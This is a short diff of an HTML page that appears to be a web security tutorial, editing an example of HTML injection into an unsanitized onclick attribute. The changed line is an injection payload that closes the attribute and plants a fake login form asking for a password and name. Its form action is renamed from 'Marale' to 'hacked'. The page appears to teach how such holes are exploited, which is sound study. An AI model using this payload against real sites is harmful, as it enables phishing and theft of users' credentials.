@@ -71,11 +71,12 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 				<i>window.href.location</i>. Its value will be like this.
 		<pre>
 &lta onclick="document.location.href='&lt+&gt';"&gt
-
 		</pre>
+		<p>
 		So , now knowing the context and the fact that there is no encoding or sanitization defense, we do this.
+	</p>
 		<pre>
-';"&lt&gtform action='Marale'&lt&gtinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&lt&gtinput type='submit'/&lt&gtlt/form&gt&lt!--
+';"&lt&gtform action='hacked'&lt&gtinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&lt&gtinput type='submit'/&lt&gtlt/form&gt&lt!--
 		</pre>
 	</p>
 	</li>
